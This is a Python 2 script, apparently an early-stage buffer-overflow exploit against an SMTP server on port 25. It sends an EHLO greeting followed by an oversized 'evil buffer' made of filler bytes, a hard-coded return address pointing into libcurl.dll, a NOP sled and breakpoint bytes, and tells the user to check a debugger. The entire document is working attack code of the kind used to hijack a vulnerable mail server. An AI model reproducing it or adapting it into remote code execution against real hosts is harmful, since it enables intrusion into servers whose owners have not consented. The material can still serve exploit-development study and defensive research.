

#!/usr/bin/python

from socket import *
import time,os,sys

s = socket(AF_INET,SOCK_STREAM)

if len(sys.argv) < 2:
	print "[!] Usage: %s <ip>" %sys.argv[0]
	sys.exit()

host = sys.argv[1]

dummy = ("1ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"2ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"3ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"4ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"5ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"6ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"7ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"8ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"9ABCDEFGHIJKLMNOPQRSTUVWXYZ")

buf = "A" * 503
buf += "\x3a\x01\x02\x10"		# 0x1002013a call ebx from libcurl.dll
buf += "\x90" * 8
buf += dummy
buf += "\xcc" * 2000

print "[*] Sending evil buffer..."
s.connect((host,25))
s.recv(1024)
s.send('EHLO zombi3@de.org' +'\r\n')
s.recv(1024)
s.send(buf)
s.close()
print "[*] Payload sent.."
print "[*] Check debugger now."
